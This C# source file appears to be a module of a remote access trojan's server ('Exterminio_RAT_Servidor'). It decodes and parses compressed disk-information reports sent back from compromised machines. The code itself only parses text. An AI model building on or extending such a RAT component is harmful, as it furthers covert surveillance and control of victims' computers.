using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Collections.Generic; // Added for List

namespace Exterminio_RAT_Servidor
{
    public class DiskInfoProcessor
    {
        public static string ProcesarDatosDiscosRecibidos(string datosRecibidos)
        {
            try
            {
                Console.WriteLine($"Procesando datos de discos recibidos: {datosRecibidos.Length} caracteres");
                
                // Verificar que los datos empiecen con "DISCOS:"
                if (!datosRecibidos.StartsWith("DISCOS:"))
                {
                    Console.WriteLine("Datos de discos no tienen el formato correcto (debe empezar con 'DISCOS:')");
                    return "ERROR: Formato incorrecto";
                }
                
                // Extraer la parte Base64 (después de "DISCOS:")
                string base64Data = datosRecibidos.Substring(7); // "DISCOS:" tiene 7 caracteres
                Console.WriteLine($"Datos Base64 extraídos: {base64Data.Length} caracteres");
                
                // Decodificar Base64
                byte[] compressedData = Convert.FromBase64String(base64Data);
                Console.WriteLine($"Datos decodificados de Base64: {compressedData.Length} bytes");
                
                // Descomprimir con Deflate
                byte[] decompressedData = DecompressData(compressedData);
                Console.WriteLine($"Datos descomprimidos: {decompressedData.Length} bytes");
                
                // Convertir a string
                string diskInfo = Encoding.UTF8.GetString(decompressedData);
                Console.WriteLine($"Información de discos procesada: {diskInfo}");
                
                return diskInfo;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando datos de discos: {ex.Message}");
                return $"ERROR: {ex.Message}";
            }
        }
        
        private static byte[] DecompressData(byte[] compressedData)
        {
            using (MemoryStream compressedStream = new MemoryStream(compressedData))
            using (MemoryStream decompressedStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(compressedStream, CompressionMode.Decompress))
                {
                    deflateStream.CopyTo(decompressedStream);
                }
                return decompressedStream.ToArray();
            }
        }
        
        public static DiskInfo[] ParsearInformacionDiscos(string diskInfo)
        {
            try
            {
                List<DiskInfo> discos = new List<DiskInfo>();
                
                // Verificar que la información tenga el formato correcto
                if (!diskInfo.StartsWith("[DISCOS]"))
                {
                    Console.WriteLine("Formato de información de discos incorrecto");
                    return discos.ToArray();
                }
                
                // Extraer la parte entre [DISCOS] y el final
                int startIndex = diskInfo.IndexOf("|") + 1;
                int endIndex = diskInfo.LastIndexOf("]");
                
                if (startIndex <= 0 || endIndex <= startIndex)
                {
                    Console.WriteLine("No se pudo extraer la información de discos");
                    return discos.ToArray();
                }
                
                // Incluir el último ] en la extracción
                string discosInfo = diskInfo.Substring(startIndex, endIndex - startIndex + 1).Trim();
                Console.WriteLine($"Información de discos extraída: '{discosInfo}'");
                
                // Método mejorado para buscar todos los discos
                List<string> discosList = new List<string>();
                
                // Buscar todas las ocurrencias de [letra: en la cadena
                for (int i = 0; i < discosInfo.Length - 2; i++)
                {
                    // Buscar patrón [letra:
                    if (discosInfo[i] == '[' && 
                        i + 2 < discosInfo.Length && 
                        char.IsLetter(discosInfo[i + 1]) && 
                        discosInfo[i + 2] == ':')
                    {
                        // Encontrar el ] correspondiente
                        int startBracket = i;
                        int endBracket = discosInfo.IndexOf(']', startBracket);
                        
                        if (endBracket != -1)
                        {
                            // Extraer el disco completo incluyendo los corchetes
                            string disco = discosInfo.Substring(startBracket, endBracket - startBracket + 1);
                            discosList.Add(disco);
                            Console.WriteLine($"Disco encontrado: '{disco}'");
                        }
                    }
                }
                
                string[] discosArray = discosList.ToArray();
                Console.WriteLine($"Array de discos dividido: {discosArray.Length} elementos");
                
                // Debug: mostrar cada elemento del array
                for (int i = 0; i < discosArray.Length; i++)
                {
                    Console.WriteLine($"Elemento {i}: '{discosArray[i]}' (longitud: {discosArray[i].Length})");
                }
                
                foreach (string disco in discosArray)
                {
                    Console.WriteLine($"Procesando disco: '{disco}'");
                    string discoTrimmed = disco.Trim();
                    
                    // Validar que el disco tenga el formato correcto
                    if (discoTrimmed.StartsWith("[") && discoTrimmed.EndsWith("]"))
                    {
                        Console.WriteLine($"Disco válido encontrado: '{discoTrimmed}'");
                        DiskInfo discoInfo = ParsearDiscoIndividual(discoTrimmed);
                        if (discoInfo != null)
                        {
                            Console.WriteLine($"Disco parseado exitosamente: {discoInfo}");
                            discos.Add(discoInfo);
                        }
                        else
                        {
                            Console.WriteLine($"Error parseando disco: '{discoTrimmed}'");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"Disco no válido: '{discoTrimmed}'");
                    }
                }
                
                Console.WriteLine($"Parseados {discos.Count} discos");
                return discos.ToArray();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parseando información de discos: {ex.Message}");
                return new DiskInfo[0];
            }
        }
        
        private static DiskInfo ParsearDiscoIndividual(string discoString)
        {
            try
            {
                // Formato esperado: [C:((Modelo))(475.65GB/83.2GB)(TIPO))]
                // Remover los corchetes externos
                string disco = discoString.Substring(1, discoString.Length - 2);
                
                // Extraer letra de unidad (primeros caracteres hasta :)
                int colonIndex = disco.IndexOf(':');
                if (colonIndex == -1) return null;
                
                string letraUnidad = disco.Substring(0, colonIndex + 1);
                
                // Extraer modelo (entre (( y )))
                int modeloStart = disco.IndexOf("((") + 2;
                int modeloEnd = disco.IndexOf("))", modeloStart);
                if (modeloStart == -1 || modeloEnd == -1) return null;
                
                string modelo = disco.Substring(modeloStart, modeloEnd - modeloStart);
                
                // Extraer tamaño (entre )) y (TIPO)
                int tamanoStart = modeloEnd + 2;
                int tamanoEnd = disco.LastIndexOf(")(");
                if (tamanoStart == -1 || tamanoEnd == -1) return null;
                
                string tamanoInfo = disco.Substring(tamanoStart, tamanoEnd - tamanoStart);
                
                // Dividir tamaño total y espacio libre
                string[] tamanoArray = tamanoInfo.Split('/');
                if (tamanoArray.Length != 2) return null;
                
                string tamanoTotal = tamanoArray[0];
                string espacioLibre = tamanoArray[1];
                
                // Extraer tipo de partición (último entre paréntesis)
                int tipoStart = disco.LastIndexOf("(") + 1;
                int tipoEnd = disco.LastIndexOf(")");
                if (tipoStart == -1 || tipoEnd == -1) return null;
                
                string tipoParticion = disco.Substring(tipoStart, tipoEnd - tipoStart);
                
                return new DiskInfo
                {
                    LetraUnidad = letraUnidad,
                    Modelo = modelo,
                    TamanoTotal = tamanoTotal,
                    EspacioLibre = espacioLibre,
                    TipoParticion = tipoParticion
                };
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parseando disco individual '{discoString}': {ex.Message}");
                return null;
            }
        }
    }
    
    public class DiskInfo : EventArgs
    {
        public string LetraUnidad { get; set; }
        public string Modelo { get; set; }
        public string TamanoTotal { get; set; }
        public string EspacioLibre { get; set; }
        public string TipoParticion { get; set; }
        
        public override string ToString()
        {
            return $"{LetraUnidad} - {Modelo} - {TamanoTotal}/{EspacioLibre} - {TipoParticion}";
        }
    }
}
